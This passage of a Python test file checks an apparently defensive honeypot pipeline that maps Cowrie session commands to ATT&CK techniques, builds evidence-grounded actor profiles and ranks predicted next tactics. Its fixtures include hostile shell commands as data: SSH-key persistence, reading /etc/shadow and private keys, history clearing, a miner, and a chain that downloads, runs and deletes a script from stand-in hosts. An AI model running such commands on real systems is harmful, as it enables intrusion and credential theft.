        ({"persistence": ["T1098"]}, {"T1098": ["echo key >> ~/.ssh/authorized_keys"]}, []),
        ({"persistence": ["T1053"]}, {"T1053": ["crontab /tmp/jobs"]}, []),
        ({"persistence": ["T1546"]}, {"T1546": ["echo x >> ~/.bashrc"]}, []),
        ({"credential-access": ["T1003"]}, {"T1003": ["cat /etc/shadow"]}, []),
        ({"credential-access": ["T1552"]}, {"T1552": ["cat ~/.ssh/id_rsa"]}, []),
        ({"defense-evasion": ["T1070"]}, {"T1070": ["history -c"]}, []),
        ({"privilege-escalation": ["T1548"]}, {"T1548": ["sudo -l"]}, []),
        ({"lateral-movement": ["T1021"]}, {"T1021": ["ssh root@192.0.2.2"]}, []),
        ({"impact": ["T1496"]}, {"T1496": ["xmrig -o pool"]}, []),
        ({"command-and-control": ["T1105"], "execution": ["T1059"]}, {"T1105": ["wget x"], "T1059": ["./a"]}, []),
        ({"discovery": ["T1082"], "credential-access": ["T1003"]}, {"T1082": ["uname"], "T1003": ["cat /etc/shadow"]}, []),
        ({"execution": ["T1059"], "persistence": ["T1098"]}, {"T1059": ["sh a"], "T1098": ["echo key >> authorized_keys"]}, []),
    ]
    forbidden = (
        "organized actor",
        "organised actor",
        "credential stuffing",
        "active implant",
        "infrastructure rotation",
        "confirmed payload execution",
        "successful persistence",
    )
    for tactic_summary, ttp_command_map, raw_events in scenarios:
        profile = _build_evidence_grounded_actor_profile(
            tactic_summary,
            ttp_command_map,
            [],
            raw_events=raw_events,
        )
        assert profile["type"] == "Unknown"
        assert profile["sophistication"] == "Unassessed"
        assert profile["assessment_semantics"] == "evidence_grounded_behavioral_profile_not_attribution"
        assert set(("observed_facts", "supported_inferences", "unsupported_possibilities")) <= set(profile)
        rendered = json.dumps(profile).lower()
        assert not any(claim in rendered for claim in forbidden)


def test_downloader_command_without_download_event_is_candidate_and_falsifiable() -> None:
    policy = load_session_ttp_correlation_policy(
        Path("configs") / "session_ttp_correlation.trusted.json"
    )
    payload = {
        "session_id": "downloader-candidate-only",
        "commands": [
            "curl https://example.invalid/test.sh",
            "wget https://example.invalid/payload",
        ],
        "classification_events": [
            {
                "command": "curl https://example.invalid/test.sh",
                "ttp": "T1105",
                "tactic": "command-and-control",
                "source": "rule",
                "confidence": 1.0,
            },
            {
                "command": "wget https://example.invalid/payload",
                "ttp": "T1105",
                "tactic": "command-and-control",
                "source": "rule",
                "confidence": 1.0,
            },
        ],
        "raw_events": [
            {"eventid": "cowrie.command.input", "input": "curl https://example.invalid/test.sh"},
            {"eventid": "cowrie.command.input", "input": "wget https://example.invalid/payload"},
        ],
    }
    updated = apply_session_ttp_correlations(payload, policy)
    correlations = {
        item["rule_id"]: item
        for item in updated["session_ttp_correlations"]
    }

    assert "cowrie-file-transfer-correlates-t1105" not in correlations
    candidate = correlations["downloader-command-observed-correlates-t1105"]
    assert candidate["evidence_type"] == "session_correlated_candidate"
    assert candidate["apply_to_prediction"] is False
    assert "attempted tool transfer" in candidate["reason"]
    assert "not confirmed" in candidate["reason"]

    ttp_command_map = {
        "T1105": [
            "curl https://example.invalid/test.sh",
            "wget https://example.invalid/payload",
        ]
    }

    class Bundle:
        ips = []
        urls = []

    follow_on = _predict_next_action(
        ttp_command_map,
        Bundle(),
        {"command-and-control": ["T1105"]},
    )
    assert follow_on.startswith("Possible later execution")
    assert "not established" in follow_on
    assert "confirmed execution" not in follow_on.lower()

    falsifiers = _build_falsification_conditions(
        ttp_command_map,
        Bundle(),
        raw_events=payload["raw_events"],
    )
    assert any("No subsequent explicit artifact-execution" in item for item in falsifiers)
    assert any("No account, SSH-key" in item for item in falsifiers)
    assert any("No `cowrie.session.file_download` event" in item for item in falsifiers)

    profile = _build_evidence_grounded_actor_profile(
        {"command-and-control": ["T1105"]},
        ttp_command_map,
        [],
        raw_events=payload["raw_events"],
    )
    assert any("attempted tool transfer" in item for item in profile["supported_inferences"])
    assert not any(
        item.startswith("Cowrie recorded a successful file-download event")
        for item in profile["observed_facts"]
    )


def test_threat_hypothesis_semantic_matrix_distinguishes_attempt_transfer_execution_and_persistence() -> None:
    policy = load_session_ttp_correlation_policy(
        Path("configs") / "session_ttp_correlation.trusted.json"
    )
    no_command_report = deterministic_baseline_report(
        {"session_id": "semantic-none", "commands": [], "classification_events": [], "raw_events": []},
        "controlled semantic test",
    )
    assert no_command_report["threat_hypothesis"]["hypothesis_status"] == "insufficient_evidence"
    assert no_command_report["threat_hypothesis"]["falsification_conditions"] == []

    download_payload = apply_session_ttp_correlations(
        {
            "session_id": "semantic-download",
            "commands": ["wget https://example.invalid/a -O /tmp/a"],
            "classification_events": [
                {
                    "command": "wget https://example.invalid/a -O /tmp/a",
                    "ttp": "T1105",
                    "tactic": "command-and-control",
                    "source": "rule",
                    "confidence": 1.0,
                }
            ],
            "raw_events": [{"eventid": "cowrie.session.file_download", "outfile": "/tmp/a"}],
        },
        policy,
    )
    download_correlations = {
        item["rule_id"]: item for item in download_payload["session_ttp_correlations"]
    }
    confirmed_transfer = download_correlations["cowrie-file-transfer-correlates-t1105"]
    assert confirmed_transfer["evidence_type"] == "session_correlated_confirmed"
    assert "does not by itself confirm execution or persistence" in confirmed_transfer["reason"]
    assert "download-then-execute-chain-correlates-t1059" not in download_correlations

    persistence_payload = apply_session_ttp_correlations(
        {
            "session_id": "semantic-persistence-attempt",
            "commands": ["echo x >> ~/.bashrc"],
            "classification_events": [
                {
                    "command": "echo x >> ~/.bashrc",
                    "ttp": "T1546",
                    "tactic": "persistence",
                    "source": "rule",
                    "confidence": 1.0,
                }
            ],
            "raw_events": [],
        },
        policy,
    )
    persistence = next(
        item for item in persistence_payload["session_ttp_correlations"]
        if item["rule_id"] == "shell-startup-persistence-correlates-t1546"
    )
    assert persistence["evidence_type"] == "session_correlated_candidate"
    assert persistence["apply_to_prediction"] is False

    for item in policy["policy"]["rules"]:
        assert item["apply_to_prediction"] is False
        assert item["provenance"]["reviewed"] is False
    assert policy["policy"]["confidence_semantics"].endswith("not_probability")


def test_external_only_prediction_policy_requires_manifest_verified_authority() -> None:
    policy = json.loads(Path("configs/prediction_policy.trusted.json").read_text())
    assert policy["policy"]["prediction_mode"] == "external_hard_backoff_vomm"
    assert policy["policy"]["compute_weighted_ensemble_baseline"] is False
    assert policy["policy"]["primary_transition"]["source_order"] == [
        "external_seed_transition"
    ]
    assert policy["policy"]["primary_transition"]["fallback_scorer"] == ""

    snapshot = RealtimePredictionEngine(policy=policy["policy"]).predict(
        {
            "session_id": "discovery-regression",
            "observed_ttps": ["T1033", "T1082"],
            "ttp_sequence": ["T1033", "T1082"],
            "observed_tactics": ["discovery"],
            "tactic_sequence": ["discovery", "discovery"],
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0},
                {"command": "uname -a", "ttp": "T1082", "tactic": "discovery", "source": "rule", "confidence": 1.0},
            ],
        },
        event_id="discovery-regression",
    )
    assert snapshot["prediction_mode"] == "external_hard_backoff_vomm"
    assert snapshot["prediction_status"] == "model_unavailable"
    assert snapshot["final_ranking"] == []
    assert snapshot["ranking_influence"]["local_transition"] == "shadow_offline_only"
    assert snapshot["ranking_influence"]["weighted_ensemble"] == "not_computed"


def test_threat_hypothesis_factuality_matrix_covers_forty_five_scoped_scenarios() -> None:
    from production.tools.threat_hypothesis_factuality_matrix import evaluate_matrix

    result = evaluate_matrix()

    assert result["scenario_count"] == 45
    assert result["passed"] == 45
    assert result["failed"] == 0
    assert {item["category"] for item in result["results"]} >= {
        "no_command",
        "downloader_without_download",
        "confirmed_cowrie_download",
        "conflicting_strong_and_weak",
        "weak_securebert_false_positive",
        "shell_noise_only",
        "compound_download_execute",
    }


def test_session_features_preserve_legacy_payload_sequences_without_classifications() -> None:
    features = build_session_features(
        {
            "session_id": "legacy-sequence",
            "commands": ["cat /etc/passwd"],
            "ttps": ["T1003"],
            "tactics": ["credential-access"],
        }
    )

    assert features["observed_ttps"] == ["T1003"]
    assert features["ttp_sequence"] == ["T1003"]
    assert features["observed_tactics"] == ["credential-access"]
    assert features["tactic_sequence"] == ["credential-access"]


def test_behavior_regime_metadata_flags_rapid_scripted_sessions_without_affecting_weights() -> None:
    features = build_session_features(
        {
            "session_id": "predict-regime-scripted",
            "src_ip": "203.0.113.80",
            "commands": [
                "wget http://example.com/payload.sh -O /tmp/a.sh",
                "chmod +x /tmp/a.sh",
                "/tmp/a.sh",
                "rm -f /tmp/a.sh",
            ],
            "raw_events": [
                {
                    "eventid": "cowrie.command.input",
                    "input": "wget http://example.com/payload.sh -O /tmp/a.sh",
                    "timestamp": "2026-05-12T00:00:00Z",
                },
                {
                    "eventid": "cowrie.command.input",
                    "input": "chmod +x /tmp/a.sh",
                    "timestamp": "2026-05-12T00:00:01Z",
                },
                {
                    "eventid": "cowrie.command.input",
                    "input": "/tmp/a.sh",
                    "timestamp": "2026-05-12T00:00:02Z",
                },
                {
                    "eventid": "cowrie.command.input",
                    "input": "rm -f /tmp/a.sh",
                    "timestamp": "2026-05-12T00:00:03Z",
                },
            ],
            "classification_events": [
                {"command": "wget http://example.com/payload.sh -O /tmp/a.sh", "ttp": "T1105", "tactic": "command-and-control", "confidence": 1.0},
                {"command": "chmod +x /tmp/a.sh", "ttp": "T1059", "tactic": "execution", "confidence": 1.0},
            ],
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.0,
                "external_seed_transition": 0.0,
                "actor_fingerprint_transition": 0.0,
                "fallback_progression": 1.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
            "maturity": {"cold_confidence_cap": ""},
        }
    ).predict(features, event_id="evt-regime-scripted")

    regime = snapshot["behavior_regime"]
    assert regime["regime"] == "automated_scripted"
    assert regime["automation_confidence"] >= 0.65
    assert regime["affects_weights"] is False
    assert regime["raw_features"]["command_frequency_per_minute"] >= 60.0
    assert len(features["command_timing_events"]) == 4
    assert "behavior_regime_classifier" not in snapshot["active_scorers"]
    assert "behavior_regime_classifier" not in snapshot["scorer_contributions"]
    assert snapshot["active_weights"] == {"fallback_progression": 1.0}


def test_behavior_regime_metadata_keeps_spaced_exploratory_sessions_low_automation() -> None:
    features = build_session_features(
        {
            "session_id": "predict-regime-human",
            "src_ip": "203.0.113.81",
            "commands": ["whoami", "uname -a", "cat /etc/passwd"],
            "raw_events": [
                {"eventid": "cowrie.command.input", "input": "whoami", "timestamp": "2026-05-12T00:00:00Z"},
                {"eventid": "cowrie.command.input", "input": "uname -a", "timestamp": "2026-05-12T00:02:00Z"},
                {"eventid": "cowrie.command.input", "input": "cat /etc/passwd", "timestamp": "2026-05-12T00:05:00Z"},
            ],
        }
    )
    regime = classify_behavior_regime(features)
    assert regime["regime"] == "human_exploratory"
    assert regime["automation_confidence"] <= 0.35
    assert regime["raw_features"]["inter_command_delay_variance_seconds2"] > 0
    assert regime["affects_weights"] is False


def test_realtime_prediction_confidence_ignores_audit_only_classifications() -> None:
    features = build_session_features(
        {
            "session_id": "predict-low-confidence",
            "src_ip": "8.8.8.8",
            "commands": ["whoami", "cat /etc/passwd"],
            "tactics": ["discovery", "credential-access"],
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "both", "confidence": 0.90},
                {"command": "cat /etc/passwd", "ttp": "T1003", "tactic": "credential-access", "source": "securebert", "confidence": 0.40},
            ],
            "enrichment_status": {"status": "fresh", "providers": ["otx"]},
        }
    )
    snapshot = RealtimePredictionEngine().predict(features, event_id="evt-low-confidence")
    assert features["ttp_sequence"] == ["T1033"]
    assert features["classification_confidence_count"] == 1
    assert snapshot["confidence_damping"]["factor"] == 0.9
    assert snapshot["classification_quality"]["audit_only_count"] == 1
    top_sources = snapshot["final_ranking"][0]["sources"]
    assert any(source["damped_by_classification_confidence"] for source in top_sources)
    assert any(source["source_type"] == "heuristic_prior" for source in top_sources)
    assert any(
        "configured fallback progression table" in source.get("evidence_sources", [])
        for source in top_sources
    )


def test_realtime_prediction_model_maturity_caps_cold_confidence() -> None:
    features = build_session_features(
        {
            "session_id": "predict-cold",
            "src_ip": "8.8.8.8",
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
            ],
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.0,
                "fallback_progression": 1.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
        }
    ).predict(features, event_id="evt-cold")
    assert snapshot["model_maturity"]["maturity"] == "cold"
    assert snapshot["model_maturity"]["prior_dominated"] is True
    assert snapshot["final_ranking"][0]["confidence"] == "low"
    assert "prior-dominated" in snapshot["model_maturity"]["warning"]


def test_realtime_prediction_applies_empirical_calibration_bins() -> None:
    features = build_session_features(
        {
            "session_id": "predict-calibrated",
            "src_ip": "8.8.8.8",
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
            ],
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.0,
                "fallback_progression": 1.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
            "calibration": {
                "enabled": True,
                "method": "empirical_binning",
                "min_cases_per_bin": 2,
                "bins": [
                    {
                        "label": "medium",
                        "min_score": 0.0,
                        "max_score": 1.0,
                        "include_upper": True,
                        "cases": 20,
                        "empirical_accuracy": 0.72,
                    }
                ],
            },
            "maturity": {"cold_confidence_cap": ""},
        }
    ).predict(features, event_id="evt-calibrated")
    assert snapshot["final_ranking"][0]["calibration"]["applied"] is True
    assert snapshot["final_ranking"][0]["calibrated_score"] == 0.72
    assert snapshot["final_ranking"][0]["confidence"] == "medium"
    assert snapshot["final_ranking"][0]["confidence_controls"]["final_confidence"] == "medium"
    assert any(
        cap["reason"] == "only one active scorer produced any weighted output"
        for cap in snapshot["final_ranking"][0]["confidence_controls"]["caps_applied"]
    )


def test_realtime_prediction_records_scorer_disagreement() -> None:
    features = build_session_features(
        {
            "session_id": "predict-disagree",
            "src_ip": "198.51.100.45",
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
            ],
            "enrichment_status": {"status": "fresh", "providers": ["otx", "shodan"]},
            "otx_tags": ["malware", "c2"],
            "risk_score": 90,
            "is_tor_exit": True,
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.0,
                "fallback_progression": 0.50,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.50,
                "vulnerability_risk": 0.0,
            },
            "maturity": {"cold_confidence_cap": ""},
        }
    ).predict(features, event_id="evt-disagree")
    assert snapshot["agreement"]["disagreement"] is True
    assert snapshot["agreement"]["divergent_scorers"]
    assert snapshot["agreement"]["top_by_scorer"]["fallback_progression"] != snapshot["agreement"]["top_by_scorer"]["enrichment_context"]


def test_realtime_prediction_caps_external_seed_only_confidence() -> None:
    features = build_session_features(
        {
            "session_id": "predict-external-only",
            "src_ip": "8.8.8.8",
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
            ],
        }
    )
    external_model = build_transition_model(
        [
            {
                "session_id": "external-seed-history",
                "is_ended": True,
                "classification_events": [
                    {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "confidence": 1.0},
                    {"command": "wget http://x/a", "ttp": "T1105", "tactic": "command-and-control", "confidence": 1.0},
                ],
            }
        ],
        source_name="external_seed_transition",
    )
    snapshot = RealtimePredictionEngine(
        {
            "external_min_sessions": 1,
            "external_min_transition_count": 1,
            "external_min_prefix_transition_count": 1,
            "external_min_technique_transition_count": 1,
            "external_min_tactic_transition_count": 1,
            "weights": {
                "local_transition": 0.0,
                "external_seed_transition": 1.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
            "maturity": {"cold_confidence_cap": ""},
        },
        external_transition_model=external_model,
    ).predict(features, event_id="evt-external-only")
    assert snapshot["final_ranking"][0]["support"]["external_seed_only"] is True
    assert snapshot["final_ranking"][0]["confidence"] == "low"
    assert any(
        cap["reason"] == "ranked tactic is supported only by the external seed prior"
        for cap in snapshot["final_ranking"][0]["confidence_controls"]["caps_applied"]
    )


def test_realtime_prediction_caps_enrichment_only_confidence() -> None:
    features = build_session_features(
        {
            "session_id": "predict-context-only",
            "src_ip": "198.51.100.45",
            "enrichment_status": {"status": "fresh", "providers": ["otx"]},
            "otx_tags": ["malware", "c2"],
            "risk_score": 90,
            "is_tor_exit": True,
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.0,
                "external_seed_transition": 0.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 1.0,
                "vulnerability_risk": 0.0,
            },
            "maturity": {"cold_confidence_cap": ""},
        }
    ).predict(features, event_id="evt-context-only")
    assert snapshot["final_ranking"][0]["support"]["context_only"] is True
    assert snapshot["final_ranking"][0]["confidence"] == "low"


def test_realtime_prediction_enrichment_modes_are_explicit() -> None:
    features = build_session_features(
        {
            "session_id": "predict-enrichment-modes",
            "src_ip": "198.51.100.45",
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
            ],
            "enrichment_status": {"status": "fresh", "providers": ["otx", "abuseipdb"]},
            "otx_tags": ["ssh", "brute force", "malware", "c2"],
            "risk_score": 90,
            "is_tor_exit": True,
        }
    )
    base_policy = {
        "prediction_mode": "weighted_ensemble_baseline",
        "min_active_scorers": 1,
        "weights": {
            "local_transition": 0.0,
            "external_seed_transition": 0.0,
            "fallback_progression": 0.60,
            "tactic_combination": 0.0,
            "mitre_association": 0.0,
            "sigma_correlation": 0.0,
            "enrichment_context": 0.40,
            "vulnerability_risk": 0.0,
        },
        "maturity": {"cold_confidence_cap": ""},
    }

    scorer_snapshot = RealtimePredictionEngine(
        {**base_policy, "enrichment_context_mode": "scorer"}
    ).predict(features, event_id="evt-enrichment-scorer")
    assert scorer_snapshot["enrichment_context_mode"]["mode"] == "scorer"
    assert "enrichment_context" in scorer_snapshot["active_scorers"]

    excluded_snapshot = RealtimePredictionEngine(
        {**base_policy, "enrichment_context_mode": "excluded"}
    ).predict(features, event_id="evt-enrichment-excluded")
    assert excluded_snapshot["enrichment_context_mode"]["mode"] == "excluded"
    assert "enrichment_context" not in excluded_snapshot["active_scorers"]
    assert excluded_snapshot["scorer_outputs"]["enrichment_context"]
    assert all(
        source["name"] != "enrichment_context"
        for item in excluded_snapshot["final_ranking"]
        for source in item.get("sources", [])
    )

    multiplier_snapshot = RealtimePredictionEngine(
        {
            **base_policy,
            "enrichment_context_mode": "score_multiplier",
            "enrichment_context_multiplier": {"max_multiplier": 1.50, "min_enrichment_score": 0.01},
        }
    ).predict(features, event_id="evt-enrichment-multiplier")
    top = multiplier_snapshot["final_ranking"][0]
    assert multiplier_snapshot["enrichment_context_mode"]["mode"] == "score_multiplier"
    assert multiplier_snapshot["enrichment_context_mode"]["applied"] is True
    assert "enrichment_context" not in multiplier_snapshot["active_scorers"]
    assert top["context_adjustments"][0]["name"] == "enrichment_context"
    assert top["context_adjustments"][0]["counts_as_supporting_scorer"] is False
    assert "enrichment_context" not in top["support"]["supporting_scorers"]

    cutoff_features = build_session_features(
        {
            "session_id": "predict-enrichment-cutoff",
            "src_ip": "198.51.100.46",
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
            ],
            "enrichment_status": {"status": "fresh", "providers": ["otx", "abuseipdb"]},
            "otx_tags": ["credential", "ssh", "brute force"],
            "risk_score": 90,
        }
    )
    cutoff_snapshot = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "max_hypotheses": 1,
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.0,
                "external_seed_transition": 0.0,
                "fallback_progression": 1.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 1.0,
                "vulnerability_risk": 0.0,
            },
            "fallback_progression": {"discovery": ["execution", "credential-access"]},
            "enrichment_context_mode": "score_multiplier",
            "enrichment_context_multiplier": {"max_multiplier": 10.0, "min_enrichment_score": 0.01},
            "maturity": {"cold_confidence_cap": ""},
        }
    ).predict(cutoff_features, event_id="evt-enrichment-cutoff")
    assert len(cutoff_snapshot["final_ranking"]) == 1
    assert cutoff_snapshot["prediction"][0] == "credential-access"
    assert cutoff_snapshot["final_ranking"][0]["context_adjustments"][0]["name"] == "enrichment_context"


def test_realtime_prediction_deduplicates_correlated_rule_priors_by_evidence_key() -> None:
    features = build_session_features(
        {
            "session_id": "predict-rule-dedup",
            "src_ip": "203.0.113.25",
            "commands": ["curl http://example.com/payload.sh", "sh /tmp/payload.sh"],
            "classification_events": [
                {
                    "command": "curl http://example.com/payload.sh",
                    "ttp": "T1105",
                    "tactic": "command-and-control",
                    "source": "rule",
                    "confidence": 1.0,
                },
                {
                    "command": "sh /tmp/payload.sh",
                    "ttp": "T1059",
                    "tactic": "execution",
                    "source": "rule",
                    "confidence": 1.0,
                },
            ],
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.0,
                "external_seed_transition": 0.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.5,
                "mitre_association": 0.5,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
            "maturity": {"cold_confidence_cap": ""},
            "rule_prior_deduplication": {
                "enabled": True,
                "method": "max_contribution",
                "scorers": ["tactic_combination", "mitre_association"],
                "require_shared_evidence_key": True,
            },
            "tactic_combination_rules": [
                {
                    "rule_id": "tc-download-execution",
                    "enabled": True,
                    "source_type": "heuristic_prior",
                    "evidence_key": "download-execution-chain",
                    "required_tactics": ["command-and-control", "execution"],
                    "provenance": {
                        "method": "manual_review",
                        "basis": ["unit"],
                        "author": "test",
                        "created": "2026-05-20",
                        "version": "1.0",
                    },
                    "evidence_sources": ["unit tactic-combination prior"],
                    "references": ["https://attack.mitre.org/"],
                    "confidence_policy": "unit",
                    "hypotheses": [
                        {"tactic": "persistence", "score": 0.4, "reason": "combination suggests persistence"},
                        {"tactic": "defense-evasion", "score": 0.3, "reason": "combination suggests cleanup"},
                    ],
                }
            ],
            "mitre_association_rules": [
                {
                    "rule_id": "mitre-download-execution",
                    "enabled": True,
                    "source_type": "human_curated_attck_prior",
                    "evidence_key": "download-execution-chain",
                    "required_ttps": ["T1059", "T1105"],
                    "provenance": {
                        "method": "manual_review",
                        "basis": ["unit"],
                        "author": "test",
                        "created": "2026-05-20",
                        "version": "1.0",
                    },
                    "evidence_sources": ["unit ATT&CK association prior"],
                    "references": ["https://attack.mitre.org/"],
                    "confidence_policy": "unit",
                    "temporal_claim": False,
                    "hypotheses": [
                        {
                            "technique": "T1053",
                            "tactic": "persistence",
                            "score": 0.22,
                            "reason": "ATT&CK association suggests persistence",
                        },
                        {
                            "technique": "T1070",
                            "tactic": "defense-evasion",
                            "score": 0.18,
                            "reason": "ATT&CK association suggests cleanup",
                        },
                    ],
                }
            ],
        }
    ).predict(features, event_id="evt-rule-dedup")

    persistence = next(item for item in snapshot["final_ranking"] if item["tactic"] == "persistence")
    assert persistence["score"] == 0.2
    assert "_rule_prior_dedup_groups" not in persistence
    assert persistence["rule_prior_deduplication"]["deduplicated_source_count"] == 1
    assert persistence["rule_prior_deduplication"]["groups"][0]["group_key"] == "persistence|download-execution-chain"
    assert persistence["support"]["supporting_scorers"] == ["tactic_combination"]

    sources = {source["name"]: source for source in persistence["sources"]}
    assert set(sources) == {"tactic_combination", "mitre_association"}
    assert sources["tactic_combination"]["weighted_score"] == 0.2
    assert sources["tactic_combination"]["deduplication"]["applied"] is False
    assert sources["mitre_association"]["pre_dedup_weighted_score"] == 0.11
    assert sources["mitre_association"]["weighted_score"] == 0.0
    assert sources["mitre_association"]["deduplication"]["applied"] is True
    assert sources["mitre_association"]["deduplication"]["retained"] is False
    assert sources["mitre_association"]["deduplication"]["retained_source"] == "tactic_combination"

    mitre_persistence = next(
        item
        for item in snapshot["scorer_contributions"]["mitre_association"]["outputs"]
        if item["tactic"] == "persistence"
    )
    assert mitre_persistence["pre_dedup_contribution"] == 0.11
    assert mitre_persistence["contribution"] == 0.0
    assert mitre_persistence["deduplication"]["retained"] is False


def test_realtime_prediction_disagreement_penalty_keeps_top3_available() -> None:
    features = build_session_features(
        {
            "session_id": "predict-disagreement-cap",
            "src_ip": "198.51.100.45",
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
            ],
            "enrichment_status": {"status": "fresh", "providers": ["otx"]},
            "otx_tags": ["malware", "c2"],
            "risk_score": 90,
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.0,
                "external_seed_transition": 0.0,
                "fallback_progression": 0.5,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.5,
                "vulnerability_risk": 0.0,
            },
            "maturity": {"cold_confidence_cap": ""},
            "confidence_controls": {"high_divergence_ratio": 0.4, "high_divergence_cap": "low"},
        }
    ).predict(features, event_id="evt-disagreement-cap")
    assert snapshot["agreement"]["divergence_ratio"] >= 0.5
    assert snapshot["final_ranking"][0]["confidence"] == "low"
    assert len(snapshot["prediction"]) >= 3


def test_prediction_policy_file_loads_versioned_rules() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        policy_path = root / "prediction_policy.json"
        config_path = root / "production_config.json"
        policy_path.write_text(
            json.dumps(
                {
                    "schema_version": "prediction_policy.v1",
                    "policy_id": "unit-policy",
                    "version": "1.2.3",
                    "updated_at": "2026-05-17T00:00:00Z",
                    "policy": {
                        "weights": {"mitre_association": 0.9},
                        "mitre_association_rules": [
                            {
                                "rule_id": "unit-mitre-rule",
                                "enabled": True,
                                "any_ttps": ["T1059"],
                                "source_type": "human_curated_attck_prior",
                                "provenance": {
                                    "method": "manual_review",
                                    "basis": ["unit"],
                                    "author": "test",
                                    "created": "2026-05-20",
                                    "version": "1.0",
                                },
                                "evidence_sources": ["unit test prior"],
                                "references": ["https://attack.mitre.org/"],
                                "hypotheses": [
                                    {
                                        "technique": "T1053",
                                        "tactic": "persistence",
                                        "score": 0.2,
                                        "reason": "unit configured prior matched",
                                    }
                                ],
                            }
                        ],
                    },
                }
            ),
            encoding="utf-8",
        )
        config_path.write_text(json.dumps({"prediction_policy_path": str(policy_path)}), encoding="utf-8")

        cfg = ProductionConfig.from_env(str(config_path))
        assert cfg.prediction_policy["policy_metadata"]["policy_id"] == "unit-policy"
        assert cfg.prediction_policy["weights"]["mitre_association"] == 0.9
        assert cfg.prediction_policy["mitre_association_rules"][0]["rule_id"] == "unit-mitre-rule"


def test_trusted_policy_uses_honest_provenance_labels() -> None:
    policy_path = Path("configs") / "prediction_policy.trusted.json"
    loaded = json.loads(policy_path.read_text(encoding="utf-8"))
    policy = loaded["policy"]
    mitre_rule = policy["mitre_association_rules"][0]
    sigma_rule = policy["sigma_correlation_rules"][0]
    assert mitre_rule["source_type"] == "human_curated_attck_prior"
    assert mitre_rule["provenance"]["method"] == "manual_review"
    assert mitre_rule["provenance"]["generated_by_tie"] is False
    assert mitre_rule["temporal_claim"] is False
    assert sigma_rule["inference_type"] == "indirect_detection_context"
    assert sigma_rule["temporal_claim"] is False


def test_prediction_policy_validation_blocks_missing_provenance() -> None:
    invalid = {
        "schema_version": "prediction_policy.v1",
        "policy": {
            "weights": {"mitre_association": 1.0},
            "mitre_association_rules": [
                {
                    "rule_id": "bad-rule",
                    "enabled": True,
                    "source_type": "human_curated_attck_prior",
                    "any_ttps": ["T1059"],
                    "hypotheses": [{"tactic": "persistence", "score": 0.2, "reason": "missing provenance"}],
                }
            ],
        },
    }
    errors = validate_policy_document(invalid)
    assert any("provenance" in error for error in errors)
    assert any("references" in error for error in errors)

    invalid_dedup = {
        "schema_version": "prediction_policy.v1",
        "policy": {
            "weights": {"fallback_progression": 1.0},
            "rule_prior_deduplication": {
                "enabled": True,
                "method": "graph_merge",
                "scorers": ["tactic_combination", "mitre_association"],
                "require_shared_evidence_key": True,
            },
        },
    }
    dedup_errors = validate_policy_document(invalid_dedup)
    assert any("rule_prior_deduplication.method" in error for error in dedup_errors)

    invalid_actor_prior = {
        "schema_version": "prediction_policy.v1",
        "policy": {
            "weights": {"fallback_progression": 1.0},
            "actor_fingerprint_prior": {
                "enabled": "yes",
                "match_fields": [],
                "min_sessions": -1,
            },
        },
    }
    actor_errors = validate_policy_document(invalid_actor_prior)
